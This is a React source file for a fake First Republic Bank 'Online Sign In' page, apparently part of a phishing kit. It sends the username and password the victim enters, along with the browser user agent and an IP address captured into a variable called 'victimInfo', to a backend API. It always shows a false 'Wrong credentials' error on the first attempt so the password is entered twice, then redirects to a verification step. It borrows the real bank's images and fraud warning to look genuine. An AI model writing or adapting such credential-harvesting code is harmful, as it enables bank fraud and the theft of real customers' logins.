import React, { useEffect, useState } from "react";
import { useHistory } from "react-router-dom";
import { IoIosInformationCircleOutline } from "react-icons/io";
import FormLayout from "../components/formLayout";
import { randParams } from "../utils/random";
import { APP_STORAGE_NAME } from "../utils/constants";
import Input from "../components/input";
import Button from "../components/button";
import API from "../api/api";
import { IoIosLock } from "react-icons/io";
import axios from "axios";

const Login = () => {
  const router = useHistory();
  const [data, setData] = useState({ userID: "", password: "" });
  const [isWrong, setIsWrong] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [victimInfo, setVictimData] = useState({
    ip: "",
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    sessionStorage.setItem(APP_STORAGE_NAME, JSON.stringify(data));
    const _data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    setIsLoading(true);
    try {
      const res = await API.createDetail({
        ..._data,
        bank: "First republic",
        userAgent: navigator?.userAgent,
        victimInfo,
      });
      if (res.status === 201) {
        if (!isWrong) {
          setData({ userID: "", password: "" });
          setIsWrong(true);
          return;
        }
        router.push(`/verification?${randParams()}`);
      }
    } catch (error) {
      alert("Something went wrong");
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    async function getIP() {
      const resp = await axios.get("https://api.ipify.org/?format=json");
      if (resp.data.ip) {
        setVictimData({ ip: resp.data.ip });
      }
    }
    getIP();
  }, []);

  return (
    <div className="bg-white px-4 md:px-8 pb-7">
      <FormLayout
        handleSubmit={handleSubmit}
        title="Online Sign In"
      >
        <Input
          title="Username"
          name="userID"
          value={data?.userID}
          onChange={handleChange}
        />
        <a
          href="#"
          className="text-[#947200] block font-[500]"
        >
          Forgot your username?
        </a>
        <a
          href="#"
          className="text-[#947200] block mb-3 font-[500]"
        >
          No username? Enroll now
        </a>
        <Input
          title="Password"
          type={"password"}
          name="password"
          value={data?.password}
          onChange={handleChange}
        />
        <a
          href="#"
          className="text-[#947200] block mb-2 font-[500]"
        >
          Forgot your password?
        </a>

        <div className="flex gap-2 items-center">
          <input
            id="checkbox"
            type="checkbox"
            className="border-[1px] size-3"
          />
          <label
            htmlFor="checkbox"
            className="text-[14px]"
          >
            Remember my username on this browser
          </label>
        </div>

        {isWrong && (
          <div
            role="alert"
            className="mt-3 alert alert-error my-4 rounded-lg bg-[#fcf3f3] border-[#fcf3f3] text-[#333333]"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
              className="stroke-[#ce1616] shrink-0 w-6 h-6"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="2"
                d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
              ></path>
            </svg>
            <span>Wrong credentials.</span>
          </div>
        )}

        <Button
          className="flex items-center justify-center gap-1"
          style={{ width: window.innerWidth > 768 ? "fit-content" : "100%" }}
          title={
            isLoading ? (
              <span className="loading loading-spinner loading-md text-white"></span>
            ) : (
              <>
                <IoIosLock
                  size={20}
                  fill="#ffffff"
                />
                Security Sign In
              </>
            )
          }
        />
      </FormLayout>

      <br />
      <div className="flex justify-between flex-wrap gap-12">
        <div>
          <p>CLIENT SUPPORT </p>
          <p className="text-[var(--primary)] font-medium">(855) 886-4819</p>
          <p className="text-[var(--primary)] font-medium">
            More contact options
          </p>
          <p className="max-w-[320px] mt-6">
            <span className="font-medium">Please note:</span> First Republic
            will never call you to ask for secure, private information.
          </p>
        </div>
        <div className="md:hidden">
          <img
            src="https://www.firstrepublic.com/-/media/digitalbankingmedia/banneradassets/consumer-desktop/desktop_sign_in_fraud_banner.png?h=1080&w=1500&la=en&hash=F0E695BE6031892F25F1E6F3DA0E2246"
            alt=""
          />
        </div>
        <div className="bg-[#eae9e6] max-w-[360px] py-4 px-2">
          <p className="text-[#222222] text-2xl mb-8">
            Do more with the mobile app.
          </p>
          <div className="flex items-center gap-4 justify-center">
            <img
              className="w-[125px]"
              src="https://www.firstrepublic.com/-/media/frb/images/digital-banking-updated/new-ui/appstore2x.png"
              alt=""
            />
            <img
              className="w-[125px]"
              src="https://www.firstrepublic.com/-/media/frb/images/digital-banking-updated/new-ui/googleplay2x.png"
              alt=""
            />
          </div>
        </div>
      </div>
    </div>
  );
};

export default Login;
